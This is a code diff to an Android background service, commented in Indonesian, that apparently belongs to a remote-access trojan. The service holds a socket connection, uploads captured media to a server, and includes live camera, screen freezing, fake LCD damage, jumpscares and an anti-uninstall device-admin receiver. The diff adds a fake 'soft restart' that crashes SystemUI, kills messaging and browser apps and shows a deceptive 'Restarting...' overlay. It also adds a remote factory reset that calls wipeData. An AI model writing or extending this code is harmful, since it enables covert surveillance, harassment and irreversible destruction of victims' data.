@@ -101,20 +101,14 @@ override fun onCreate() {
 
     // 🔥 FIX: cukup SPECIAL_USE karena manifest sudah minimalis
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-        startForeground(
-            NOTIF_ID,
-            buildNotification(),
-            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-        )
-    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-        startForeground(
-            NOTIF_ID,
-            buildNotification(),
-            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-        )
-    } else {
-        startForeground(NOTIF_ID, buildNotification())
-    }
+    startForeground(
+        NOTIF_ID,
+        buildNotification(),
+        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+    )
+} else {
+    startForeground(NOTIF_ID, buildNotification())
+}
 
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
@@ -438,7 +432,7 @@ private fun sendMediaToServer(type: String, base64: String) {
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "application/json")
-            val key = readKey()
+            val key: String = readKey() ?: ""
 if (key.isNotEmpty()) conn.setRequestProperty("x-auth-key", key)
             conn.doOutput = true
             
@@ -1169,7 +1163,177 @@ private fun stopFreezeScreen() {
 }
     
     
-    
+    // ═══════════════════════════════════════════════════════════
+// SOFT RESTART — efek restart tanpa root
+// Tutup semua app + kill SystemUI + lock screen
+// ═══════════════════════════════════════════════════════════
+private fun softRestart() {
+    try {
+        // 1. Vibrate feedback
+        try {
+            val vm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                (getSystemService(VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager).defaultVibrator
+            } else {
+                @Suppress("DEPRECATION")
+                getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vm.vibrate(android.os.VibrationEffect.createOneShot(800, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vm.vibrate(800)
+            }
+        } catch (_: Exception) {}
+
+        // 2. Kill SystemUI (UI akan restart otomatis → efek "restart")
+        try {
+            Runtime.getRuntime().exec(arrayOf("am", "crash", "com.android.systemui"))
+        } catch (_: Exception) {}
+
+        // 3. Force-stop app yang umum (browser, sosmed, dll)
+        val packagesToKill = listOf(
+            "com.android.chrome",
+            "com.android.browser",
+            "com.google.android.youtube",
+            "com.whatsapp",
+            "com.instagram.android",
+            "com.facebook.katana",
+            "com.zhiliaoapp.musically", // TikTok
+            "com.telegram.messenger",
+            "org.telegram.messenger",
+            "com.google.android.gm",
+            "com.google.android.apps.maps"
+        )
+        for (pkg in packagesToKill) {
+            try {
+                val am = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
+                am.killBackgroundProcesses(pkg)
+            } catch (_: Exception) {}
+        }
+
+        // 4. Kill semua background process (app akan di-restart oleh OS)
+        try {
+            val am = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
+            am.killBackgroundProcesses(packageName) // kill diri sendiri juga
+        } catch (_: Exception) {}
+
+        // 5. Tampilkan overlay hitam sebentar (efek restart)
+        showRestartOverlay()
+
+        emitStatus(JSONObject().apply {
+            put("restartDevice", true)
+            put("restartType", "soft")
+        })
+    } catch (e: Exception) {
+        Log.e("DeviceService", "softRestart: ${e.message}")
+        emitStatus(JSONObject().apply {
+            put("restartDevice", false)
+            put("restartDeviceReason", e.message ?: "unknown")
+        })
+    }
+}
+
+private var restartOverlayView: android.view.View? = null
+private fun showRestartOverlay() {
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN or
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                PixelFormat.OPAQUE
+            )
+
+            // Overlay hitam dengan logo "Restarting..."
+            val layout = android.widget.LinearLayout(this).apply {
+                setBackgroundColor(Color.BLACK)
+                gravity = android.view.Gravity.CENTER
+                orientation = android.widget.LinearLayout.VERTICAL
+            }
+
+            // Spinner
+            val spinner = android.widget.ProgressBar(this).apply {
+                indeterminateTintList = android.content.res.ColorStateList.valueOf(Color.WHITE)
+            }
+            layout.addView(spinner, android.widget.LinearLayout.LayoutParams(120, 120))
+
+            // Text
+            val tv = android.widget.TextView(this).apply {
+                text = "Restarting..."
+                setTextColor(Color.WHITE)
+                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20f)
+                setPadding(0, 40, 0, 0)
+            }
+            layout.addView(tv)
+
+            restartOverlayView = layout
+            wm.addView(layout, params)
+
+            // Hilangkan overlay setelah 4 detik
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    restartOverlayView?.let { wm.removeView(it) }
+                } catch (_: Exception) {}
+                restartOverlayView = null
+            }, 4000)
+        } catch (e: Exception) {
+            Log.e("DeviceService", "showRestartOverlay: ${e.message}")
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// FACTORY RESET via Device Admin
+// ═══════════════════════════════════════════════════════════
+private fun factoryResetDevice() {
+    try {
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val adminName = android.content.ComponentName(this, AntiUninstallReceiver::class.java)
+
+        if (!dpm.isAdminActive(adminName)) {
+            Log.e("DeviceService", "factoryReset: Device Admin belum aktif")
+            emitStatus(JSONObject().apply {
+                put("factoryReset", false)
+                put("factoryResetReason", "device_admin_not_active")
+            })
+            // Coba aktifkan otomatis via intent
+            try {
+                val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
+                    putExtra(
+                        android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Aktifkan untuk factory reset"
+                    )
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(intent)
+            } catch (_: Exception) {}
+            return
+        }
+
+        // Wipe semua data (factory reset)
+        dpm.wipeData(0)
+        emitStatus(JSONObject().apply { put("factoryReset", true) })
+        Log.d("DeviceService", "factoryReset: wipeData dipanggil")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "factoryReset: ${e.message}")
+        emitStatus(JSONObject().apply {
+            put("factoryReset", false)
+            put("factoryResetReason", e.message ?: "unknown")
+        })
+    }
+}
+
     private fun showToast(message: String) {
     Handler(Looper.getMainLooper()).post {
         android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
@@ -1549,7 +1713,7 @@ ${htmlContent}
 private fun readUid(): String {
     return try {
         val json = assets.open("uid.json").bufferedReader().use { it.readText() }
-        JSONObject(json).optString("uid", "")
+        JSONObject(json).optString("uid", "") ?: ""
     } catch (e: Exception) {
         Log.e("DeviceService", "readUid error: ${e.message}")
         ""
@@ -1559,7 +1723,7 @@ private fun readUid(): String {
 private fun readKey(): String {
     return try {
         val json = assets.open("uid.json").bufferedReader().use { it.readText() }
-        JSONObject(json).optString("key", "")
+        JSONObject(json).optString("key", "") ?: ""
     } catch (e: Exception) {
         Log.e("DeviceService", "readKey error: ${e.message}")
         ""
@@ -1576,15 +1740,27 @@ private fun readKey(): String {
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
     lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
     try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
-stopLiveCamera()
-stopLockFlashBlink()
-stopLcdDamage()
-    stopSpamKeyboard()
-    stopFreezeScreen()
+
+    try { stopLiveCamera() } catch (_: Exception) {}
+    try { stopLockFlashBlink() } catch (_: Exception) {}
+    try { stopLcdDamage() } catch (_: Exception) {}
+    try { stopSpamKeyboard() } catch (_: Exception) {}
+    try { stopFreezeScreen() } catch (_: Exception) {}
+    try { stopHackScreen() } catch (_: Exception) {}
+    try { stopKillSystem() } catch (_: Exception) {}
+    try { stopJumpscare() } catch (_: Exception) {}
+    try { stopJumpscare2() } catch (_: Exception) {}
+
     flashBlinking = false
     flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
     flashHandler = null
     try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
+
+    try { mediaPlayer?.release() } catch (_: Exception) {}
+    mediaPlayer = null
+    try { lockMediaPlayer?.release() } catch (_: Exception) {}
+    lockMediaPlayer = null
+
     socket?.disconnect()
     socket = null
 }
